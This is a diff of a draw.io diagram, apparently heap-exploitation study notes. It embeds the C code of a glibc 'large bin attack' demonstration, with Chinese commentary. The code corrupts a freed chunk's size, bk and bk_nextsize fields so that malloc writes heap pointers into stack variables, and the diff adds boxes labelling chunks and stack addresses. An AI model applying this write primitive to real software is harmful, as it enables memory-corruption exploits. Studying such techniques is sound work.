@@ -1,32 +1,53 @@
-<mxfile host="app.diagrams.net" modified="2024-02-03T15:24:31.455Z" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" etag="6d-TQC7Ynd7e1JJslf_c" version="23.1.0" type="github">
+<mxfile host="app.diagrams.net" modified="2024-02-04T02:01:48.540Z" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" etag="Lp9dahKLUslHHGpGw7ci" version="23.1.1" type="github">
   <diagram name="第 1 页" id="StGOxZ_9_frYLXdIoDuh">
-    <mxGraphModel dx="2704" dy="522" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
+    <mxGraphModel dx="2331" dy="399" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
-        <mxCell id="g7S3FFpujZysDaOgMtKl-1" value="unsigned long stack_var1 = 0;&#xa;unsigned long stack_var2 = 0;" style="text;whiteSpace=wrap;" vertex="1" parent="1">
+        <mxCell id="g7S3FFpujZysDaOgMtKl-1" value="unsigned long stack_var1 = 0;&#xa;unsigned long stack_var2 = 0;" style="text;whiteSpace=wrap;" parent="1" vertex="1">
           <mxGeometry x="10" y="50" width="190" height="40" as="geometry" />
         </mxCell>
-        <mxCell id="g7S3FFpujZysDaOgMtKl-2" value="unsigned long *p1 = malloc(0x320);&#xa;fprintf(stderr, &quot;现在，我们在堆上分配第一个大块的地址为：%p\n&quot;, p1 - 2);&#xa;&#xa;&#xa;fprintf(stderr, &quot;然后分配另一个 fastbin 块，以避免在 free() 期间将下一个大块与第一个大块合并\n\n&quot;);&#xa;malloc(0x20);&#xa;&#xa;&#xa;unsigned long *p2 = malloc(0x400);&#xa;fprintf(stderr, &quot;然后，在堆上分配第二个大块的地址为：%p\n&quot;, p2 - 2);&#xa;&#xa;&#xa;fprintf(stderr, &quot;然后分配另一个 fastbin 块，以避免在 free() 期间将下一个大块与第二个大块合并\n\n&quot;);&#xa;malloc(0x20);&#xa;&#xa;&#xa;unsigned long *p3 = malloc(0x400);&#xa;fprintf(stderr, &quot;最后，在堆上分配第三个大块的地址为：%p\n&quot;, p3 - 2);&#xa;&#xa;&#xa;fprintf(stderr, &quot;然后分配另一个 fastbin 块，以避免在 free() 期间将顶部块与第三个大块合并\n\n&quot;);&#xa;malloc(0x20);&#xa;&#xa;&#xa;free(p1);&#xa;free(p2);&#xa;fprintf(stderr, &quot;现在我们释放第一个和第二个大块，它们将被插入未排序的 bin 中：%p &lt;--&gt; %p\n\n&quot;,&#xa;        (void *)(p2 - 2), (void *)(p2[0]));&#xa;&#xa;&#xa;void* p4 = malloc(0x90);&#xa;fprintf(stderr, &quot;现在，我们分配一个大小小于释放的第一个大块的块。这将把释放的第二个大块移动到大型 bin 空闲列表中，使用释放的第一个大块的部分进行分配，并重新将剩余的释放的第一个大块插入未排序的 bin 中：%p\n\n&quot;,&#xa;        (void *)((char *)p1 + 0x90));&#xa;&#xa;&#xa;free(p3);&#xa;fprintf(stderr, &quot;现在，我们释放第三个大块，它将被插入未排序的 bin 中：%p &lt;--&gt; %p\n\n&quot;,&#xa;        (void *)(p3 - 2), (void *)(p3[0]));&#xa;&#xa;&#xa;//------------VULNERABILITY-----------&#xa;&#xa;&#xa;fprintf(stderr, &quot;现在模拟一个可以覆盖释放的第二个大块的“size”以及其“bk”和“bk_nextsize”指针的漏洞\n&quot;);&#xa;fprintf(stderr, &quot;基本上，我们减少了释放的第二个大块的大小，以强制 malloc 将释放的第三个大块插入到大型 bin 空闲列表的开头。为了覆盖堆栈变量，我们将“bk”设置为在 stack_var1 之前 16 字节，并将“bk_nextsize”设置为在 stack_var2 之前 32 字节\n\n&quot;);&#xa;&#xa;&#xa;p2[-1] = 0x3f1;&#xa;p2[0] = 0;&#xa;p2[2] = 0;&#xa;p2[1] = (unsigned long)(&amp;stack_var1 - 2);&#xa;p2[3] = (unsigned long)(&amp;stack_var2 - 4);&#xa;&#xa;&#xa;//------------------------------------&#xa;&#xa;&#xa;malloc(0x90);&#xa;&#xa;&#xa;fprintf(stderr, &quot;让我们再次调用 malloc，这样释放的第三个大块将被插入到大型 bin 空闲列表中。在此期间，目标应该已经被重写了：\n&quot;);&#xa;&#xa;&#xa;fprintf(stderr, &quot;stack_var1 (%p): %p\n&quot;, &amp;stack_var1, (void *)stack_var1);&#xa;fprintf(stderr, &quot;stack_var2 (%p): %p\n&quot;, &amp;stack_var2, (void *)stack_var2);" style="text;whiteSpace=wrap;" vertex="1" parent="1">
-          <mxGeometry x="-1390" y="240" width="1460" height="1090" as="geometry" />
+        <mxCell id="g7S3FFpujZysDaOgMtKl-2" value="unsigned long *p1 = malloc(0x320);&#xa;fprintf(stderr, &quot;现在，我们在堆上分配第一个大块的地址为：%p\n&quot;, p1 - 2);&#xa;&#xa;&#xa;fprintf(stderr, &quot;然后分配另一个 fastbin 块，以避免在 free() 期间将下一个大块与第一个大块合并\n\n&quot;);&#xa;malloc(0x20);&#xa;&#xa;&#xa;unsigned long *p2 = malloc(0x400);&#xa;fprintf(stderr, &quot;然后，在堆上分配第二个大块的地址为：%p\n&quot;, p2 - 2);&#xa;&#xa;&#xa;fprintf(stderr, &quot;然后分配另一个 fastbin 块，以避免在 free() 期间将下一个大块与第二个大块合并\n\n&quot;);&#xa;malloc(0x20);&#xa;&#xa;&#xa;unsigned long *p3 = malloc(0x400);&#xa;fprintf(stderr, &quot;最后，在堆上分配第三个大块的地址为：%p\n&quot;, p3 - 2);&#xa;&#xa;&#xa;fprintf(stderr, &quot;然后分配另一个 fastbin 块，以避免在 free() 期间将顶部块与第三个大块合并\n\n&quot;);&#xa;malloc(0x20);&#xa;&#xa;&#xa;free(p1);&#xa;free(p2);&#xa;fprintf(stderr, &quot;现在我们释放第一个和第二个大块，它们将被插入未排序的 bin 中：%p &lt;--&gt; %p\n\n&quot;,&#xa;        (void *)(p2 - 2), (void *)(p2[0]));&#xa;&#xa;&#xa;void* p4 = malloc(0x90);&#xa;fprintf(stderr, &quot;现在，我们分配一个大小小于释放的第一个大块的块。这将把释放的第二个大块移动到大型 bin 空闲列表中，使用释放的第一个大块的部分进行分配，并重新将剩余的释放的第一个大块插入未排序的 bin 中：%p\n\n&quot;,&#xa;        (void *)((char *)p1 + 0x90));&#xa;&#xa;&#xa;free(p3);&#xa;fprintf(stderr, &quot;现在，我们释放第三个大块，它将被插入未排序的 bin 中：%p &lt;--&gt; %p\n\n&quot;,&#xa;        (void *)(p3 - 2), (void *)(p3[0]));&#xa;&#xa;&#xa;//------------VULNERABILITY-----------&#xa;&#xa;&#xa;fprintf(stderr, &quot;现在模拟一个可以覆盖释放的第二个大块的“size”以及其“bk”和“bk_nextsize”指针的漏洞\n&quot;);&#xa;fprintf(stderr, &quot;基本上，我们减少了释放的第二个大块的大小，以强制 malloc 将释放的第三个大块插入到大型 bin 空闲列表的开头。为了覆盖堆栈变量，我们将“bk”设置为在 stack_var1 之前 16 字节，并将“bk_nextsize”设置为在 stack_var2 之前 32 字节\n\n&quot;);&#xa;&#xa;&#xa;p2[-1] = 0x3f1;&#xa;p2[0] = 0;&#xa;p2[2] = 0;&#xa;p2[1] = (unsigned long)(&amp;stack_var1 - 2);&#xa;p2[3] = (unsigned long)(&amp;stack_var2 - 4);&#xa;&#xa;&#xa;//------------------------------------&#xa;&#xa;&#xa;malloc(0x90);&#xa;&#xa;&#xa;fprintf(stderr, &quot;让我们再次调用 malloc，这样释放的第三个大块将被插入到大型 bin 空闲列表中。在此期间，目标应该已经被重写了：\n&quot;);&#xa;&#xa;&#xa;fprintf(stderr, &quot;stack_var1 (%p): %p\n&quot;, &amp;stack_var1, (void *)stack_var1);&#xa;fprintf(stderr, &quot;stack_var2 (%p): %p\n&quot;, &amp;stack_var2, (void *)stack_var2);" style="text;whiteSpace=wrap;" parent="1" vertex="1">
+          <mxGeometry x="-1050" y="650" width="1460" height="1090" as="geometry" />
         </mxCell>
-        <mxCell id="g7S3FFpujZysDaOgMtKl-3" value="&lt;span style=&quot;color: rgb(0, 0, 0); font-family: Helvetica; font-size: 12px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(251, 251, 251); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; float: none; display: inline !important;&quot;&gt;unsigned long *p1 = malloc(0x320);&lt;/span&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+        <mxCell id="g7S3FFpujZysDaOgMtKl-3" value="&lt;span style=&quot;color: rgb(0, 0, 0); font-family: Helvetica; font-size: 12px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(251, 251, 251); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; float: none; display: inline !important;&quot;&gt;unsigned long *p1 = malloc(0x320);&lt;/span&gt;" style="text;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="10" y="120" width="210" height="40" as="geometry" />
         </mxCell>
-        <mxCell id="g7S3FFpujZysDaOgMtKl-4" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
-          <mxGeometry x="490" y="360" width="120" height="60" as="geometry" />
+        <mxCell id="g7S3FFpujZysDaOgMtKl-4" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
+          <mxGeometry x="540" y="1200" width="120" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="g7S3FFpujZysDaOgMtKl-5" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
-          <mxGeometry x="470" y="150" width="120" height="60" as="geometry" />
+        <mxCell id="g7S3FFpujZysDaOgMtKl-5" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
+          <mxGeometry x="520" y="990" width="120" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="g7S3FFpujZysDaOgMtKl-6" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
-          <mxGeometry x="890" y="150" width="120" height="60" as="geometry" />
+        <mxCell id="g7S3FFpujZysDaOgMtKl-6" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
+          <mxGeometry x="940" y="990" width="120" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="g7S3FFpujZysDaOgMtKl-7" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
-          <mxGeometry x="690" y="150" width="120" height="60" as="geometry" />
+        <mxCell id="g7S3FFpujZysDaOgMtKl-7" value="" style="rounded=0;whiteSpace=wrap;html=1;" parent="1" vertex="1">
+          <mxGeometry x="740" y="990" width="120" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="g7S3FFpujZysDaOgMtKl-8" value="unsorted" style="text;strokeColor=none;align=center;fillColor=none;html=1;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
-          <mxGeometry x="350" y="220" width="60" height="30" as="geometry" />
+        <mxCell id="g7S3FFpujZysDaOgMtKl-8" value="unsorted" style="text;strokeColor=none;align=center;fillColor=none;html=1;verticalAlign=middle;whiteSpace=wrap;rounded=0;" parent="1" vertex="1">
+          <mxGeometry x="400" y="1060" width="60" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="Vp2Y29IAKWfL_nbuRybc-1" value="p1" style="text;strokeColor=none;align=center;fillColor=none;html=1;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="170" y="200" width="60" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="Vp2Y29IAKWfL_nbuRybc-2" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+          <mxGeometry x="300" y="150" width="120" height="160" as="geometry" />
+        </mxCell>
+        <mxCell id="Vp2Y29IAKWfL_nbuRybc-4" value="" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+          <mxGeometry x="300" y="150" width="120" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="Vp2Y29IAKWfL_nbuRybc-5" value="0x320" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+          <mxGeometry x="300" y="180" width="120" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="Vp2Y29IAKWfL_nbuRybc-6" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.75;exitDx=0;exitDy=0;entryX=0.02;entryY=0.455;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1" source="Vp2Y29IAKWfL_nbuRybc-1" target="Vp2Y29IAKWfL_nbuRybc-2">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="Vp2Y29IAKWfL_nbuRybc-7" value="&amp;amp;stack_var1=0x7fffffffde98" style="text;strokeColor=none;align=center;fillColor=none;html=1;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-140" y="190" width="200" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="Vp2Y29IAKWfL_nbuRybc-8" value="&amp;amp;stack_var1=0x7fffffffdea0" style="text;strokeColor=none;align=center;fillColor=none;html=1;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-140" y="260" width="200" height="30" as="geometry" />
         </mxCell>
       </root>
     </mxGraphModel>
